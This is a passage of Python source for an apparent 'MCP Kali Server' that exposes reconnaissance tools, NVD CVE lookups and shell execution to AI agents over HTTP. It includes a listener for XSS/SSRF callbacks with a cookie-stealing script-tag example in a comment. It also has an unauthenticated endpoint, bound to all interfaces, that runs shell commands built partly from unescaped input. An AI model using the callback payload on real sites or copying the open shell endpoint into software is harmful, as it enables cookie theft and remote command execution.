        return f"echo {shlex.quote(args['target'])} | httpx {flags} 2>&1 | head -100"

    elif tool == "aquatone":
        out   = args.get("out", "/tmp/aquatone_out")
        flags = args.get("flags", "")
        return f"echo {shlex.quote(args['hosts'])} | aquatone -out {shlex.quote(out)} {flags} 2>&1 | head -60"

    return None


NVD_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

def nvd_search(keyword, severity=None, limit=20):
    limit   = min(int(limit), 50)
    params  = {"keywordSearch": keyword, "resultsPerPage": limit}
    if severity:
        params["cvssV3Severity"] = severity.upper()
    url = NVD_BASE + "?" + urllib.parse.urlencode(params)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "manucaspt/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        lines = [f"Total: {data.get('totalResults',0)}  Showing: {len(vulns)}\n"]
        for v in vulns:
            cve   = v["cve"]
            cid   = cve["id"]
            desc  = (cve.get("descriptions") or [{}])[0].get("value", "")[:120]
            score = ""
            metrics = cve.get("metrics", {})
            for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                if key in metrics:
                    score = metrics[key][0]["cvssData"].get("baseScore", "")
                    sev   = metrics[key][0].get("baseSeverity") or metrics[key][0]["cvssData"].get("baseSeverity","")
                    score = f"{score} ({sev})"
                    break
            lines.append(f"[{cid}] CVSS:{score}\n  {desc}\n")
        return "\n".join(lines)
    except Exception as e:
        return f"[NVD API error: {e}]"

def nvd_lookup(cve_id):
    cve_id = cve_id.upper().strip()
    url = NVD_BASE + "?" + urllib.parse.urlencode({"cveId": cve_id})
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "manucaspt/1.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        if not vulns:
            return f"[{cve_id}] não encontrado na NVD."
        cve  = vulns[0]["cve"]
        desc = "\n".join(d["value"] for d in cve.get("descriptions", []) if d.get("lang") in ("en","pt"))
        refs = [r["url"] for r in cve.get("references", [])[:6]]
        score = "N/A"
        metrics = cve.get("metrics", {})
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if key in metrics:
                d     = metrics[key][0]["cvssData"]
                sev   = metrics[key][0].get("baseSeverity") or d.get("baseSeverity","")
                score = f"{d.get('baseScore','?')} {sev}  Vector:{d.get('vectorString','')}"
                break
        published = cve.get("published","")[:10]
        modified  = cve.get("lastModified","")[:10]
        out  = f"=== {cve_id} ===\n"
        out += f"Published : {published}  Modified: {modified}\n"
        out += f"CVSS      : {score}\n\n"
        out += f"Description:\n{desc}\n\n"
        out += "References:\n" + "\n".join(refs)
        return out
    except Exception as e:
        return f"[NVD API error: {e}]"


def run_command(cmd, timeout=60):
    print(f"  [exec] {cmd}")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=min(timeout, 300)
        )
        out = result.stdout or ""
        err = result.stderr or ""
        combined = (out + err).strip() or "(sem output)"
        return combined[:8000]
    except subprocess.TimeoutExpired:
        return f"[timeout após {timeout}s]"
    except Exception as e:
        return f"[erro: {e}]"


# ── In-memory callback store (XSS / SSRF / OOB DNS hits) ─────────────────────
_CALLBACKS = []  # list of dicts: {time, ip, path, data}

# ── HTTP Handler ───────────────────────────────────────────────────────────────

class MCPHandler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ("/", "/tools"):
            tools_list = [
                {"name": k, "description": v["description"], "inputSchema": v["input_schema"]}
                for k, v in TOOLS.items()
            ]
            body = json.dumps({"tools": tools_list}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(body)
        elif path == "/ping":
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b"pong")
        elif path == "/callbacks":
            body = json.dumps(_CALLBACKS[-100:]).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(body)
        elif path.startswith("/cb") or path.startswith("/xss") or path.startswith("/ssrf"):
            # XSS/SSRF GET callback (e.g. <script src=http://kali:3000/cb?c=COOKIE>)
            qs = parse_qs(urlparse(self.path).query)
            entry = {
                "time": __import__('datetime').datetime.now().isoformat(),
                "ip":   self.client_address[0],
                "path": path,
                "data": {k: v[0] for k, v in qs.items()},
            }
            _CALLBACKS.append(entry)
            print(f"  [CALLBACK] {entry}")
            self.send_response(200)
            self._cors()
            self.end_headers()
            self.wfile.write(b"")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        raw    = self.rfile.read(length) if length else b"{}"
        try:
            args = json.loads(raw)
        except Exception:
            args = {}

        if path.startswith("/call/"):
            tool = path[6:].strip("/")
            if tool not in TOOLS:
                self.send_response(400)
                self._cors()
                self.end_headers()
                self.wfile.write(json.dumps({"error": f"unknown tool: {tool}"}).encode())
                return

            if tool == "cve_search":
                output = nvd_search(args.get("keyword",""), args.get("severity"), args.get("limit", 20))
                cmd    = f"[NVD API] keyword={args.get('keyword')} severity={args.get('severity')} limit={args.get('limit',20)}"
            elif tool == "cve_lookup":
                output = nvd_lookup(args.get("cve_id",""))
                cmd    = f"[NVD API] lookup={args.get('cve_id')}"
            else:
                cmd     = build_command(tool, args)
                timeout = int(args.get("timeout", 60))
                output  = run_command(cmd, timeout=timeout)

            resp = json.dumps({"output": output, "command": cmd}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self._cors()
            self.end_headers()
            self.wfile.write(resp)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[{self.address_string()}] {fmt % args}")


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 3000
    server = HTTPServer(("0.0.0.0", port), MCPHandler)
    print(f"")
    print(f"  ╔══════════════════════════════════════╗")
    print(f"  ║   MCP Kali Server   port {port:<5}       ║")
    print(f"  ╚══════════════════════════════════════╝")
    print(f"")
    print(f"  Tools ({len(TOOLS)}): {', '.join(TOOLS.keys())}")
    print(f"")
    print(f"  Ctrl+C to stop")
    print(f"")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[stopped]")
